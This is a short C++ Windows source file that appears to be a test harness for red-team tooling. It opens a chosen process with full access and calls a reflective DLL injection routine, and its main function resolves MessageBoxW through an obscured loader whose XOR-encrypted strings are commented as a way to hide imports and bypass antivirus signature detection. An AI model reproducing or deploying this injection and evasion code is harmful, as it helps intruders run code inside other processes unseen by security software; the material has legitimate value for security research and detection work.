#define _CRT_SECURE_NO_WARNINGS
#include "includes.h"
//#include "BasicDLLInjection.h"
#include "ReflectiveDLLInjection.h"
#include "GetProcAddressSilent.h"

void TestInNewProcess(WCHAR *argv[])
{
	PWCHAR currentDir = new WCHAR[32768];
	GetCurrentDirectoryW(32768, currentDir);
	PROCESS_INFORMATION procinfo = { 0 };
	STARTUPINFOW si = { 0 };
	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, currentDir, &si, &procinfo))
	{
		std::cout << "Failed to create process error code " << GetLastError() << '\n';
	}

	Reflective_DLLInjection(procinfo.dwProcessId, procinfo.hProcess, argv[2]);
	CloseHandle(procinfo.hProcess);
}

void TestInSpecifiedProcess(WCHAR *argv[])
{
	PWSTR end;
	DWORD pid = wcstol(argv[1], &end, 10);

	std::cout << "[main] Finding process with pid " << pid << '\n';

	// Open process
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	std::cout << "[main] Process handle=" << process << ", error code " << GetLastError() << '\n';
	if (!process)
		return;


	Reflective_DLLInjection(pid, process, argv[2]);
	CloseHandle(process);
}

int wmain(int argc, WCHAR *argv[])
{
	if (argc < 3)
	{
		std::cout << "Usage: " << argv[0] << " <pid> <dllPath>\n";
		return 0;
	}

	HMODULE usr32 = LoadLibraryW(L"user32.dll");
	// Call MessageBoxW without displaying it on Imports Table
	// Strings are XOR-Encrypted to bypass AntiVirus string-signature-detection
	((INT(WINAPI *)(HWND, LPCWSTR, LPCWSTR, UINT))GetProcAddressSilentObscured(10, L"\x32\x34\x22\x35\x74\x75\x69\x23\x2B\x2B", 11, "\x0A\x22\x34\x34\x26\x20\x22\x05\x28\x3F\x10"))(NULL, L"Silently loaded MessageBoxW", L"XDXDXDXDX", MB_OK | MB_ICONWARNING);

	//TestInSpecifiedProcess(argv);
	return 0;
}